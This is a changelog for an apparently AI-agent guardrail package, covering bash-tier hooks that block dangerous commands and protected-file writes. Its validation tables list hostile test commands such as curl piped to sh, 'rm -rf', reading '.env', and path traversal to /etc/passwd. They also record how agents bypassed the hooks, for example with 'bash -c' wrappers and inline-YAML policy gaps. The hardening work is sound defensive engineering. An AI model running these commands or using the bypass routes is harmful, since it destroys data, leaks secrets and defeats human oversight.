# @bookedsolid/rea

## 0.18.0

### Minor Changes

- 653a560: Close cycle 7: helix-020 + discord-ops Round 10 + helixir 43-95 selected fixes + iron-gate runtime defaults.

  Six P1/P2 active-blocking findings closed. The architectural items
  from helixir's audit (verdict cache, audit log rotation, postinstall
  auto-upgrade) remain queued — this release ships every actively-
  blocking finding plus the runtime model-pin enforcement helixir asked
  for.

  ### Findings closed

  | #    | Sev | File                                                                  | Fix                                                                                                                                                                                                                                                                                                                                                           |
  | ---- | --- | --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
  | G1.A | P1  | `hooks/_lib/cmd-segments.sh`                                          | `_rea_unwrap_nested_shells` now runs AFTER quote-mask. Wrappers inside outer-quoted prose (`git commit -m "...bash -c '...'..."`) are masked out and never matched. helix-020 #A.                                                                                                                                                                             |
  | G1.B | P1  | `hooks/_lib/policy-read.sh::policy_list`                              | Inline-YAML arrays (`blocked_paths: [.env, .env.*]`) now parse correctly. Pre-fix only block sequences (`- entry`) parsed; inline form yielded empty list and silently bypassed `blocked-paths-bash-gate` while Write/Edit gate (different reader) still enforced. Asymmetric silent bypass closed. helix-020 #B.                                             |
  | G1.C | P2  | (same `policy_list` extension)                                        | Same fix closes the inline-array gap on `protected_writes`. helix-020 #C.                                                                                                                                                                                                                                                                                     |
  | G2   | P1  | `hooks/_lib/protected-paths.sh::rea_path_is_protected`                | Override-first ordering. Explicit `protected_writes` / `protected_paths` entries are now consulted BEFORE the extension-surface allow-list short-circuit. A consumer hardening `.husky/pre-push.d/` via override is no longer silently overruled. helix-020 interactive #1.                                                                                   |
  | G3.A | P1  | `hooks/security-disclosure-gate.sh`                                   | `--body-file` content is now actually read and folded into `FULL_TEXT` before pattern scan. Pre-fix the 0.17.0 awk rewrite had a string-handling regression that silently skipped body content. discord-ops Round 10 #1.                                                                                                                                      |
  | G3.B | P2  | (same hook)                                                           | `--body-file` tokenizer in plain (unquoted) mode now interprets `\X` (any char) as literal `X` — POSIX shell escape semantics. `gh issue create --body-file path\ with\ spaces.md` no longer truncates at `\`. helix-020 interactive #2.                                                                                                                      |
  | G4.A | P2  | `hooks/attribution-advisory.sh`                                       | Migrated from substring `grep` to `any_segment_starts_with`. Same anchoring class as 0.16.3 F5. Commit messages or prose mentioning `Co-Authored-By:` no longer false-positive. discord-ops Round 10 #2.                                                                                                                                                      |
  | G4.B | P2  | `.husky/commit-msg` (template source `src/cli/install/commit-msg.ts`) | Pattern refined to exclude `*@users.noreply.github.com` (legitimate GitHub-collaborator footer) while still matching `*@anthropic.com`, `*@openai.com`, etc. AI-tool noreply forms. discord-ops Round 10 #3.                                                                                                                                                  |
  | G5   | P2  | `commands/codex-review.md` ↔ `agents/codex-adversarial.md`            | Reconciled cross-release docs/agents contradiction. Runtime is the truth: `src/hooks/push-gate/index.ts` always emits the audit record on review completion (`safeAppend` at line 561). Both documents now state "Emit audit entry — REQUIRED" in identical wording. Closes the helixir #6 contradiction flagged on rounds 65, 66, 73 across 0.14.0 → 0.17.0. |
  | G6   | P3  | `src/cli/upgrade.ts`                                                  | `rea upgrade` now reads the live profile from `.rea/policy.yaml` instead of the existing manifest. Pre-fix, manifests created before profile-tracking landed recorded `"unknown"`, and every subsequent upgrade re-stamped `"unknown"` forever. helix-020 cosmetic.                                                                                           |

  ### Iron-gate runtime defaults (helixir + user directive)

  `src/hooks/push-gate/codex-runner.ts` now hardcodes `gpt-5.4` + `high`
  as the runtime defaults when `policy.review.codex_model` /
  `codex_reasoning_effort` are unset. Pre-fix, undefined options fell
  back to codex's own defaults — `codex-auto-review` at medium
  reasoning, NOT the flagship — silently downgrading reviews when
  policy didn't pin. Now:
  - Iron-gate is enforced at the runtime layer, not the policy layer.
  - Policy can OVERRIDE to a different model/effort but cannot opt out
    into codex's defaults (config.toml or otherwise).
  - `agents/codex-adversarial.md` Step 4 invokes `/codex:adversarial-review --model gpt-5.4` explicitly, pinning the iron-gate model on the
    interactive `/codex-review` path too.

  Both runtime invocation sites — push-gate (subprocess) and agent
  (slash command) — now route through `gpt-5.4` + `high` by default.
  Test `codex-runner.test.ts` updated to assert the new behavior.

  ### Architectural items deferred to 0.18.1+

  The plan covered three architectural surfaces (G7 verdict cache, G8.A
  audit-log rotation, G8.B postinstall auto-upgrade). Implementation
  was rate-limited mid-Wave-C; the actively-blocking hook fixes ship
  now to unblock helix's seventh push attempt. Queued:
  - **G7** — `.rea/last-review.cache.json` keyed by head_sha; durable
    PASS verdict; flip-flag detection in last-review.json. Closes
    helixir #1, #4, #7, #8.
  - **G8.A** — `policy.audit.max_size_mb` (default 50 MB) + rotation
    with chain-continuation hash. Closes helixir #9.
  - **G8.B** — `package.json` postinstall manifest-drift detection +
    auto-run upgrade. Closes helixir #3.

  ### Test coverage
  - 1257 vitest tests pass (was 1247 in 0.17.0), +10 fixtures
  - All 6 quality gates green: test, test:dogfood, test:bash-syntax,
    lint, type-check, build
  - Idempotency regression test from 0.17.0 still green — `rea init` ×
    2 byte-identical
  - Bash-tier corpus extended with helix-020 + discord-ops Round 10
    fixtures asserting every cited bypass + every cited false-positive

  ### Empirical validation

  | Hook                      | Case                                                                      | Pre-fix                           | This release                            |
  | ------------------------- | ------------------------------------------------------------------------- | --------------------------------- | --------------------------------------- |
  | dependency-audit-gate     | `git commit -m "docs: mention bash -c 'npm install left-pad'"`            | block (FP)                        | allow                                   |
  | blocked-paths-bash-gate   | `blocked_paths: [.env]` (inline YAML) + `echo x > .env`                   | allow (silent bypass)             | block                                   |
  | protected-paths-bash-gate | `protected_writes: [.husky/pre-push.d/]` + write to `.husky/pre-push.d/X` | allow (override silently lost)    | block                                   |
  | security-disclosure-gate  | `gh issue create --body-file <sensitive>`                                 | allow (silent skip)               | block                                   |
  | security-disclosure-gate  | `gh issue create --body-file path\ with\ spaces.md` (sensitive)           | allow (truncate at `\`)           | block                                   |
  | attribution-advisory      | commit body containing `Co-Authored-By:` as documentation prose           | block (FP)                        | allow                                   |
  | husky/commit-msg          | `Co-Authored-By: user@users.noreply.github.com`                           | block (FP)                        | allow                                   |
  | husky/commit-msg          | `Co-Authored-By: noreply@anthropic.com` (true AI footer)                  | block                             | block                                   |
  | codex-runner              | `policy.review.codex_model` unset                                         | uses `codex-auto-review` (medium) | uses `gpt-5.4` (high) — runtime default |
  | upgrade                   | `rea upgrade` after policy profile change                                 | manifest stuck at old/`unknown`   | manifest reflects live policy.yaml      |

  Reports: `helix/.reports/codex/rea-bugs/020-0.17.0-protected-paths-extension-shortcircuit-and-bodyfile-escapes.md`, discord-ops Round 10 (chat-relayed), helixir 43-95 audit (chat-relayed).

## 0.17.0

### Minor Changes

- 3dbb638: Comprehensive Bash-tier hardening (helix-017 + helix-018 + helix-019) and install idempotency.

  The 0.17.0 minor bump consolidates every open consumer-reported finding
  plus a long-standing install-idempotency defect. Three full-cycle
  root-cause classes resolved, one architectural mechanism re-shaped,
  plus byte-identical re-init.

  ### helix-017 — Nested-shell wrapper bypass closed (3 P1/P2)

  Pre-fix `bash -c 'PAYLOAD'`, `sh -lc "PAYLOAD"`, and equivalents
  defeated every Bash-tier guard. The outer segment's first token was
  `bash` so all `any_segment_starts_with` checks skipped. A single shell
  wrapper bypassed H1/H3-H17 in dangerous-bash-interceptor, the redirect
  detector in protected-paths-bash-gate, and the install-pattern check
  in dependency-audit-gate.

  `hooks/_lib/cmd-segments.sh` gains `_rea_unwrap_nested_shells` —
  recognizes `(bash|sh|zsh|dash|ksh) [flags] -(c|lc|lic|ic|cl|cli|li|il)
QUOTED_ARG` patterns and emits each inner PAYLOAD as a separate
  record. `_rea_split_segments` runs the unwrap as its first stage so
  quote-mask + separator-split process the wrapper line + every inner
  payload uniformly. `dependency-audit-gate.sh` migrated to use the
  shared splitter so it inherits unwrap + the full separator set.
  `dangerous-bash-interceptor.sh` H12 (curl/wget piped to shell) now
  scans every unwrap-emitted line so `zsh -c "curl https://x | sh"` is
  caught.

  Single-quoted bodies have no escape semantics; double-quoted bodies
  treat `\"` and `\\` as literal POSIX escapes. Multiple wrappers per
  command-line are handled. One level of unwrapping today; deeper
  nesting is additive without changing the contract.

  ### helix-018 Option A — Full policy-driven `protected_writes`

  Pre-fix `_lib/protected-paths.sh::REA_PROTECTED_PATTERNS_FULL` was
  hardcoded. 0.16.3 F7 added `protected_paths_relax` (subtract from the
  hardcoded set); 0.17.0 adds `protected_writes` (declare the set).

  When `protected_writes` is set in `.rea/policy.yaml`, it fully owns
  the protected list — kill-switch invariants (`.rea/HALT`,
  `.rea/policy.yaml`, `.claude/settings.json`) are always added back
  regardless. `protected_paths_relax` then runs as a subtractor on
  whatever set is in effect (kill-switch invariants remain
  non-relaxable). Both keys can coexist; precedence is documented in
  the lib header.

  ```yaml
  # Add a new path the default doesn't know about
  protected_writes:
    - .claude/settings.json
    - .claude/settings.local.json
    - .husky/pre-commit
    - .husky/commit-msg
    - .husky/pre-push
    - .github/workflows/ # NEW — protect CI workflows from agent edits
  ```

  The `.husky/{commit-msg,pre-push,pre-commit}.d/*` extension surface
  shipped in 0.16.4 still overrides protection because the
  `rea_path_is_extension_surface` helper short-circuits before the
  pattern check.

  zod schema in `src/policy/loader.ts`, type in `src/policy/types.ts`,
  profile schema in `src/policy/profiles.ts` all extended.

  ### helix-019 — Three findings in 0.16.4 new code

  **019 #1 [P1]** `security-disclosure-gate.sh` `--body-file` traversal
  silently skipped. Pre-fix paths whose canonical form used `..` to
  escape REA_ROOT logged "skipping body scan" and exited 0 — every
  sensitive payload at the resolved external location bypassed the
  disclosure gate. 0.17.0 hard-refuses with exit 2 + actionable stderr
  advisory naming the path and resolved form.

  **019 #2 [P2]** `_extract_body_file_paths` whitespace tokenizer broke
  quoted paths. Pre-fix `--body-file "security notes.md"` was split
  into 3 tokens; the hook tried to read `"security` (with leading
  quote), failed, and silently omitted the body from the scan. 0.17.0
  walks the command with quote-state awareness — single- and
  double-quoted spans treat whitespace as part of the token. Inner
  escapes (`\"`, `\\`) handled per POSIX.

  **019 #3 [P2]** `dependency-audit-gate.sh` background-`&` regression.
  The local segmenter splat on `||&&;|` only — bare `&` was missing.
  `echo warmup & pnpm add typo-pkg` stayed merged into one segment so
  the install-pattern leading-token check skipped the install. 0.17.0
  migrates audit-gate to `_rea_split_segments` from the shared lib,
  inheriting bare `&` (added in 0.16.1) plus quote-mask + nested-shell
  unwrap.

  ### Install idempotency

  Pre-fix, every `rea init` re-stamped `installed_at` in
  `.rea/policy.yaml` and `.rea/install-manifest.json` with `new
Date().toISOString()`. Re-running init produced a non-empty diff.

  0.17.0 reads the existing `installed_at` from each file (if present)
  and preserves it. The first install date is the semantic truth —
  re-runs reflect refreshes, not new installs. Falls back to
  `new Date()` only when the file is absent or unparseable.

  Verified empirically: `cp -r` rea repo to tmpdir, `npm install
@bookedsolid/rea`, run `rea init --yes` twice, `find | sha256sum` on
  both states — diff is now empty.

  ### Test coverage
  - 1247 vitest tests pass (was 1218 in 0.16.4), +29 new fixtures
  - Bash-tier corpus: 110 entries (was 73 in 0.16.2), +37 across the
    cycle
  - 5 helix-017 fixtures for dangerous-bash (every wrapper variant +
    zsh -c curl-pipe)
  - 6 helix-017 fixtures for protected-paths-bash-gate (4 protected
    paths + double-quoted body + benign passthrough)
  - 2 helix-017 fixtures for dependency-audit (npm + pnpm wrappers)
  - 7 helix-018 Option A fixtures (default, override, kill-switch
    invariants always-on, additive, override + relax precedence)
  - 5 helix-019 fixtures (traversal refuse + quoted-spaces sensitive +
    quoted-spaces single-quote + quoted-spaces benign + background-&
    audit)
  - 2 idempotency fixtures in `src/cli/init.test.ts` (policy.yaml +
    install-manifest.json `installed_at` preservation)
  - All 6 quality gates green: test, test:dogfood, test:bash-syntax,
    lint, type-check, build

  ### Empirical validation

  | Hook                           | Case                                                   | Pre-fix             | This release                       |
  | ------------------------------ | ------------------------------------------------------ | ------------------- | ---------------------------------- |
  | dangerous-bash-interceptor     | `bash -lc 'git push --force origin HEAD'`              | allow (bypass)      | block                              |
  | dangerous-bash-interceptor     | `sh -c 'rm -rf .'`                                     | allow               | block                              |
  | dangerous-bash-interceptor     | `bash -c 'git commit --no-verify -m fix'`              | allow               | block                              |
  | dangerous-bash-interceptor     | `zsh -c "curl https://x \| sh"`                        | allow               | block                              |
  | dangerous-bash-interceptor     | `bash -lic 'git restore .'`                            | allow               | block                              |
  | protected-paths-bash-gate      | `bash -lc 'printf x > .rea/HALT'`                      | allow               | block                              |
  | protected-paths-bash-gate      | `sh -c 'echo evil > .rea/policy.yaml'`                 | allow               | block                              |
  | protected-paths-bash-gate      | `bash -c 'cat /dev/null > .claude/settings.json'`      | allow               | block                              |
  | protected-paths-bash-gate      | `bash -lc 'cp evil .husky/pre-push'`                   | allow               | block                              |
  | protected-paths-bash-gate      | `bash -c "printf x > .rea/HALT"` (double-quote)        | allow               | block                              |
  | protected-paths-bash-gate      | `bash -c 'echo hello > docs/notes.md'` (benign)        | allow               | allow                              |
  | dependency-audit-gate          | `bash -lc 'npm install pkg'`                           | allow (bypass)      | block                              |
  | dependency-audit-gate          | `sh -c 'pnpm add pkg'`                                 | allow               | block                              |
  | dependency-audit-gate          | `echo warmup & pnpm add pkg`                           | allow               | block                              |
  | dependency-audit-gate          | `sleep 0 & npm install pkg`                            | allow               | block                              |
  | security-disclosure-gate       | `gh issue create --body-file ../../etc/passwd`         | allow (silent skip) | refuse                             |
  | security-disclosure-gate       | `gh issue create --body-file "name with spaces.md"`    | allow (silent skip) | block (sensitive) / allow (benign) |
  | protected-paths-bash-gate (F7) | default policy + `.github/workflows/release.yml` write | allow               | allow                              |
  | protected-paths-bash-gate (F7) | `protected_writes: [.github/workflows/]` + same write  | allow               | block                              |
  | `rea init` × 2                 | second run mutates policy.yaml + manifest              | non-idempotent      | byte-identical                     |

  ### Convergence

  helix's report 019 confirms every prior open finding (014, 015, 016,
  016-1, 016-2, 017, 018) is closed in shipped releases. Cycle 6 was
  the first with zero carry-overs. 0.17.0 closes the three new findings
  (019 #1, #2, #3) in one shot. The remaining work shifts to fixture
  corpus expansion — already on track at 110 entries.

## 0.16.4

### Patch Changes

- d55a0f4: Close helix-018 Option B: Bash-tier `.husky/{commit-msg,pre-push,pre-commit}.d/*` carve-out.

  helix-018 reports that the `.husky/<hookname>.d/*` extension surface — the
  documented rea-blessed slot for consumer-authored husky fragments since
  0.13.0 / 0.13.2 — was refused by the Bash-tier `protected-paths-bash-gate.sh`
  even though the Write-tier `settings-protection.sh §5b` allow-list explicitly
  permits it. Result: a consumer who tried to author a fragment via shell
  redirect (`cat <<EOF > .husky/pre-push.d/20-helix-cem-drift`) was blocked,
  while the equivalent Write-tool call succeeded. The two tiers were
  inconsistent on what the rea contract actually covers.

  ### Fix

  `hooks/_lib/protected-paths.sh` now exposes a `rea_path_is_extension_surface`
  helper and `rea_path_is_protected` short-circuits to "not protected" when
  the path is inside the surface. The carve-out matches `.husky/commit-msg.d/*`,
  `.husky/pre-push.d/*`, and `.husky/pre-commit.d/*` (case-insensitive) and
  requires a fragment AFTER the `.d/` segment (so the bare directory itself
  or sibling-named directories like `.husky/pre-push.d.bak/` still hit the
  parent prefix block).

  `protected-paths-bash-gate.sh` and any future caller of `rea_path_is_protected`
  inherit the carve-out automatically. `blocked-paths-bash-gate.sh` (the
  soft user-declared list, shipped in 0.16.3 F3) is intentionally NOT
  extended — that list is policy-driven and the user's explicit intent
  should win there.

  ### What this does NOT change
  - Write-tier `settings-protection.sh §5b` allow-list — already shipped in
    0.13.2, verified working via 3 new corpus fixtures in this release. The
    helix-018 report's claim that §5b blocked the path may be a
    misattribution; the Bash-tier was the actual gap.
  - helix-018 Option A (full policy-driven `protected_writes` re-design) is
    deferred to 0.17.0 where it can be paired with deprecation of the
    `protected_paths_relax` key shipped in 0.16.3 F7.

  ### Empirical validation

  | Hook                      | Case                                                      | Pre-fix | This branch |
  | ------------------------- | --------------------------------------------------------- | ------- | ----------- |
  | protected-paths-bash-gate | `echo "..." > .husky/pre-push.d/20-helix-cem-drift`       | block   | allow       |
  | protected-paths-bash-gate | `echo x > .husky/commit-msg.d/30-styles-token-discipline` | block   | allow       |
  | protected-paths-bash-gate | `echo x > .husky/pre-commit.d/40-eslint-staged`           | block   | allow       |
  | protected-paths-bash-gate | `echo x > .husky/pre-push` (parent script)                | block   | block       |
  | protected-paths-bash-gate | `echo x > .husky/pre-push.d.bak/00-evil` (sibling-named)  | block   | block       |
  | protected-paths-bash-gate | `echo x > .husky/_/pre-push` (husky 9 stub)               | block   | block       |
  | settings-protection §5b   | Write to `.husky/pre-push.d/20-helix-cem-drift`           | allow   | allow       |
  | settings-protection §5b   | Write to `.husky/commit-msg.d/30-helix-styles`            | allow   | allow       |
  | settings-protection §5b   | Write to `.husky/pre-push` (parent body)                  | block   | block       |

  ### Test coverage
  - 1218 vitest tests (was 1208 in 0.16.3), +10 helix-018 fixtures: 7 for
    the bash-tier carve-out (every allow + every still-blocked sibling),
    3 verifying §5b's existing Write-tier behavior so it can never silently
    regress.
  - `pnpm test:dogfood` clean.
  - `pnpm test:bash-syntax`, `pnpm lint`, `pnpm type-check`, `pnpm build` all clean.

## 0.16.3

### Patch Changes

- 1d9e0d8: Close 8 unaddressed findings: 2 helix-016.1 carry-forwards (filed against
  0.16.1, restated against 0.16.2), 4 discord-ops Round 9 findings against
  0.16.2, plus 2 user-reported design issues surfaced during 0.16.3
  implementation (F7 hardcoded-protection escape hatch, F8 self-trip in the
  new F4 body-file scanner). Every finding gets a corpus-pinned fixture so
  the fix cannot silently regress.

  ### Findings closed

  | #   | Sev | File                                                                                                                                         | Change                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
  | --- | --- | -------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
  | F1  | P1  | `src/hooks/push-gate/codex-runner.ts`                                                                                                        | Pre-flight `codex --version` probe before the long-running review subprocess. ENOENT (and EACCES) on the probe surfaces `CodexNotInstalledError` synchronously so `index.ts` formats the friendly install hint as the headline `PUSH BLOCKED:` line instead of an opaque subprocess stack frame. (helix-016.1 #1, restated 016-2 #1)                                                                                                                                                                                                                                                                                                                                                                                                                                                |
  | F2  | P1  | `hooks/_lib/cmd-segments.sh`                                                                                                                 | `_rea_split_segments` gains a quote-mask preprocessing pass: an awk one-pass scan replaces `;`/`&`/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | `/newline INSIDE matched `"…"`and`'…'` spans with multi-byte sentinels before splitting, then restores the literal characters in the surviving segments. Quoted prose containing trigger words no longer fragments into phantom segments that anchor on the trigger. The "INTENTIONAL and SAFE over-splitting" comment block — empirically refuted by helix — is removed. (helix-016.1 #2, restated 016-2 #2 with empirical reproducer) |
  | F3  | P1  | new `hooks/blocked-paths-bash-gate.sh`                                                                                                       | Bash-tier counterpart for the soft `policy.yaml → blocked_paths` list. Reads `policy_list "blocked_paths"` and refuses redirects, cp/mv/sed -i tail-targets, dd `of=`, tee/truncate/install/ln, and `node -e fs.write*` calls whose resolved target matches an entry. Modeled on `protected-paths-bash-gate.sh`. Registered between `protected-paths-bash-gate.sh` and `dependency-audit-gate.sh` in `defaultDesiredHooks()` and the dogfood `.claude/settings.json`. (discord-ops Round 9 #1)                                                                                                                                                                                                                                                                                      |
  | F4  | P1  | `hooks/security-disclosure-gate.sh`                                                                                                          | Resolves `--body-file PATH` and `-F PATH` arguments, reads up to 64 KiB of each, prepends the lowercased contents to `FULL_TEXT` before pattern scan. Stdin form (`-F -`) is skipped (re-read impossible). Paths whose canonical form uses `..`-traversal escaping `REA_ROOT` are refused; plain absolute paths (e.g. `/var/folders/...` tmpfiles) are honored. Unreadable files emit a stderr advisory and continue scanning the command line. (discord-ops Round 9 #2)                                                                                                                                                                                                                                                                                                            |
  | F5  | P2  | `hooks/dangerous-bash-interceptor.sh` H17                                                                                                    | `delegate_to_subagent` patterns now match via `any_segment_starts_with` instead of unanchored `grep -F` against the whole `$CMD`. Patterns from `policy.yaml` are command prefixes (`pnpm run build`, `pnpm run test`, `pnpm run lint`); they only fire when a segment STARTS with the pattern. Commit messages and prose mentioning those prefixes no longer false-positive. ERE metacharacters in the policy patterns are escaped before the regex match. (discord-ops Round 9 #3)                                                                                                                                                                                                                                                                                                |
  | F6  | P3  | `hooks/env-file-protection.sh`                                                                                                               | `PATTERN_SOURCE` and `PATTERN_CP_ENV` migrated from `any_segment_matches` to `any_segment_starts_with`. The patterns are command prefixes (`source PATH`, `. PATH`, `cp X PATH`); commit messages or echoed prose containing `source .env` no longer fire the direct-source/cp block. (discord-ops Round 9 #4)                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
  | F7  | P1  | `hooks/_lib/protected-paths.sh` + `hooks/settings-protection.sh` + `src/policy/loader.ts` + `src/policy/types.ts` + `src/policy/profiles.ts` | New `protected_paths_relax` policy key. Pre-fix the hard-protected list was hardcoded — consumers who needed to author `.husky/<hookname>` files had no escape: settings-protection.sh §6 refused the write, and the protection list itself lived in rea-managed source that protected-paths-bash-gate.sh ALSO refused. Now the lib reads `protected_paths_relax` from policy.yaml and removes listed entries from the effective set. Kill-switch invariants (`.rea/HALT`, `.rea/policy.yaml`, `.claude/settings.json`) are silently ignored if listed AND emit a stderr advisory. settings-protection.sh §6 migrated to source the shared lib so both Write/Edit and Bash tiers honor the same effective list. (user-reported, design issue surfaced during 0.16.3 implementation) |
  | F8  | P2  | `hooks/security-disclosure-gate.sh` early-exit                                                                                               | Anchor the early-exit detection at segment start via `any_segment_starts_with`, falling back to legacy unanchored grep if `_lib/cmd-segments.sh` is unreachable. Same anchoring class as F5/F6 — surfaced when the F4-shipping orchestrator's own PR body containing the literal phrase tripped on its own change. (rea-internal, surfaced during 0.16.3 codex pass)                                                                                                                                                                                                                                                                                                                                                                                                                |

  Sibling improvement (folded into F2): H12 (curl/wget piped to shell) was
  previously checked against the raw command to preserve the multi-segment
  pipeline property. With the new quote-aware splitter, H12 now scans the
  quote-masked form of the command — same un-split shape, but in-quote pipes
  are masked. `git commit -m "...curl-pipe-shell example..."` no longer
  false-positives, while the genuine `curl … | sh` invocation still blocks.

  ### `protected_paths_relax` usage (F7)

  The new policy key is opt-in and narrow. Example:

  ```yaml
  # .rea/policy.yaml
  protected_paths_relax:
    - .husky/ # I author my own husky hooks; opt out of rea protection
  ```

  Listing a kill-switch invariant (`.rea/HALT`, `.rea/policy.yaml`, or
  `.claude/settings.json`) is silently dropped from the relax set AND emits
  a stderr advisory naming the offending entry. Defaults to empty — no
  behavior change for existing installs that don't declare the key.

  ### Empirical validation

  Replays of every fixture cited in helix-016.1 / 016-2, discord-ops
  Round 9, F7 (user-reported), and F8 (rea-internal), run against
  `hooks/*.sh` on this branch:

  | Hook                           | Case                                                            | Pre-fix               | This branch                |
  | ------------------------------ | --------------------------------------------------------------- | --------------------- | -------------------------- |
  | dangerous-bash-interceptor     | `echo "release note & git push --force now"`                    | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `echo "ship & ship-force-rebase docs"`                          | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `echo 'release note & git push --force now'`                    | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `git commit -m "fix: stop using git push --force; ..."`         | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `git commit -m "doc: discuss curl-pipe-shell..."`               | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `sleep 1 & git push --force` (true positive)                    | block                 | block                      |
  | dangerous-bash-interceptor     | `curl https://x \| sh` (true positive)                          | block                 | block                      |
  | dangerous-bash-interceptor     | `pnpm run build` (true positive — delegate)                     | block                 | block                      |
  | dangerous-bash-interceptor     | `git commit -m "...delegate pnpm test..."`                      | block (FP)            | allow                      |
  | dangerous-bash-interceptor     | `git commit -m "docs: explain pnpm run build delegation"`       | block (FP)            | allow                      |
  | blocked-paths-bash-gate (NEW)  | `echo x > .env`                                                 | bypass (no Bash gate) | block                      |
  | blocked-paths-bash-gate (NEW)  | `cp src.txt .env`                                               | bypass                | block                      |
  | blocked-paths-bash-gate (NEW)  | `sed -i '' '1d' .env.production`                                | bypass                | block                      |
  | blocked-paths-bash-gate (NEW)  | `node -e "fs.writeFileSync('.env','x')"`                        | bypass                | block                      |
  | blocked-paths-bash-gate (NEW)  | `tee .env < input.txt`                                          | bypass                | block                      |
  | blocked-paths-bash-gate (NEW)  | `printf x > .rea/HALT`                                          | bypass                | block                      |
  | blocked-paths-bash-gate (NEW)  | `echo x > docs/safe.md` (negative)                              | bypass                | allow                      |
  | security-disclosure-gate       | `gh issue create --body-file <body w/ "exploit">`               | allow (FP miss)       | block                      |
  | security-disclosure-gate       | `gh issue create -F <body w/ "GHSA-…">`                         | allow (FP miss)       | block                      |
  | security-disclosure-gate       | `gh issue create --body-file <benign>`                          | allow                 | allow                      |
  | security-disclosure-gate       | `gh issue create --body-file -` (stdin)                         | allow                 | allow (skip-with-advisory) |
  | security-disclosure-gate (F8)  | `gh pr create --body "context: gh issue create earlier failed"` | block (FP)            | allow                      |
  | security-disclosure-gate (F8)  | `git commit -m "docs: explain when to use gh issue create"`     | block (FP)            | allow                      |
  | env-file-protection            | `source .env` (true positive)                                   | block                 | block                      |
  | env-file-protection            | `cp .env /tmp/x` (true positive)                                | block                 | block                      |
  | env-file-protection            | `git commit -m "fix: don't source .env files"`                  | block (FP)            | allow                      |
  | env-file-protection            | `echo "do not source .env in scripts"`                          | block (FP)            | allow                      |
  | protected-paths-bash-gate (F7) | `echo x > .husky/pre-commit` (no relax)                         | block                 | block                      |
  | protected-paths-bash-gate (F7) | `echo x > .husky/pre-commit` (relax `.husky/`)                  | block                 | allow                      |
  | protected-paths-bash-gate (F7) | `echo halt > .rea/HALT` (relax `.rea/HALT`)                     | block                 | block + advisory           |
  | protected-paths-bash-gate (F7) | `cp /tmp/x .rea/policy.yaml` (relax `.rea/policy.yaml`)         | block                 | block + advisory           |
  | protected-paths-bash-gate (F7) | `echo x > .claude/settings.json` (relax `.husky/`)              | block                 | block (non-relaxed entry)  |

  ### Test coverage
  - 1208 vitest tests pass (was 1078 in 0.14.0; new 0.16.3 work adds corpus
    fixtures across `bash-tier-corpus.test.ts`, an installer-registration
    assertion in `settings-merge.test.ts`, the codex-runner async-ENOENT
    case in `codex-runner.test.ts`, and 5 protected_paths_relax tests).
  - `pnpm test:dogfood` clean (canonical hooks ↔ `.claude/hooks/`,
    `.claude/settings.json` registers all canonical hooks).
  - `pnpm test:bash-syntax` clean.
  - `pnpm lint`, `pnpm type-check`, `pnpm build` all clean.

## 0.16.2

### Patch Changes

- d814354: [security] 0.16.2 — closes 2 helix-017 false-positive regressions: env-file same-segment co-occurrence + attribution markdown-link anchor.

  ## Two new false-positive regressions surfaced by helix-017

  helix's fourth push attempt (after 0.16.1 closed the helix-016 cycle) found two more false-positive bypasses, plus confirmed helix-016 P1 #1 (curl|bash) was already fixed in 0.16.1.
  - **#1 [P1] curl|bash** — already fixed in 0.16.1 (helix tested pre-fix). No code change here. Verified via the bash-tier corpus added in 0.16.1.
  - **#2 [P2] `env-file-protection.sh` cross-segment false-positive.** Pre-fix the hook ran two independent `any_segment_matches` calls — one for utility (cat/grep/etc.), one for `.env` filename — and AND'd the resulting booleans across all segments. So `echo "log: cat is broken" ; touch foo.env` blocked because segment 1 had a utility (cat in echo body) and segment 2 had `.env` (the new file). Co-occurrence is the actual detection property and must hold within a single segment. New `any_segment_matches_both` helper in `_lib/cmd-segments.sh`; env-file-protection.sh now uses it for the utility-AND-env-filename rule.
  - **#4 [P3] markdown-link attribution regex too broad.** `.husky/commit-msg` Pattern 4 + `attribution-advisory.sh` matched ANY bracketed mention — `feat: support [Claude Code] hook output format` would block a perfectly legitimate commit/PR body. The actual structural attribution we care about is the markdown-link form `[Text](url)`, so anchor on `[Text](` (closing bracket immediately followed by `(`).
  - **#3** is a manual user policy edit (`.rea/policy.yaml` `delegate_to_subagent` shorthand) — not a rea code change. The user is making this edit out-of-band; no automated policy.yaml update in this release.

  ## New `any_segment_matches_both` helper

  Same-segment co-occurrence is a real detection property distinct from "any segment matches either pattern." Adding the primitive once in the shared lib means future hooks that need this property (env-file is the first; others may follow) get the correct semantic without each hook reinventing the boolean combinator.

  ## Bash-tier corpus extended (32 entries, +9 from 0.16.1)

  `bash-tier-corpus.test.ts` now covers:
  - 17 entries for `dangerous-bash-interceptor.sh` (unchanged)
  - 6 entries for `dependency-audit-gate.sh` (unchanged)
  - 5 entries for `env-file-protection.sh` (new: helix-017 #2 cross-segment + true-positive baseline + commit-message false-positive)
  - 4 entries for `attribution-advisory.sh` (new: helix-017 #4 bracketed-mention false-positive + true-positive markdown-link baseline)

  ## Test coverage

  1165 passed (was 1156 in 0.16.1), +9 corpus entries. All 6 quality gates green.

  ## Empirical validation

  | Command                                                                           | 0.16.1                 | 0.16.2 |
  | --------------------------------------------------------------------------------- | ---------------------- | ------ |
  | `echo "log: cat is broken" ; touch foo.env`                                       | BLOCK (false-positive) | ALLOW  |
  | `gh pr edit 42 --body "feat: support [Claude Code] hook output"`                  | BLOCK (false-positive) | ALLOW  |
  | `git commit -m "docs: clarify [Cursor] integration"`                              | BLOCK (false-positive) | ALLOW  |
  | `cat .env` (true-positive baseline)                                               | BLOCK                  | BLOCK  |
